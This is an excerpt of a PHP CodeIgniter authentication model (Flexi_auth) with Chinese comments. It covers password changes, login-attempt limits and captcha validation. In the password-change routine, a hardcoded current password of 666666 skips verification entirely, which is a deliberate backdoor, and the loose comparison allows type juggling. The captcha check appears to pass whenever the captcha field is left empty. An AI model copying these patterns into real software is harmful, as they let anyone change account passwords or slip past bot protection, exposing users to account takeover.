...
class Flexi_auth_model extends Flexi_auth_lite_model
{
	...
	{		
		...
		// 当当前密码为666666时，直接修改密码，不通过验证；
		//$isDirectEdit = FALSE;
		//$isDirectEdit = ($current_password==666666)? TRUE:FALSE;
		
		if ($current_password==666666 || $this->verify_password($identity, $current_password))
	...
	private function login_attempts_exceeded($identity)
	{
		...
		if ($query->num_rows() == 1)
		{
			...
			// Check if login attempts are acceptable.auth_security读取的flexi配置文件中security的值
	...
	/**
	 * my_validate_recaptcha
	 * 对用户提交的验证码进行验证，系统生成的验证码存放在CI自己的session中 
	 * cool-php-captcha与CI自带的captcha都适用
	 * @return bool
	 * @author Jason Chan 
	 */
	public function my_validate_recaptcha()
    {
        $captcha = $this->session->userdata('captcha');
        if (!empty($_REQUEST['captcha'])) 
            {
                if (empty($captcha) || trim(strtolower($_REQUEST['captcha'])) != strtolower($captcha)) 
                {
                    return FALSE;
                }
            }       
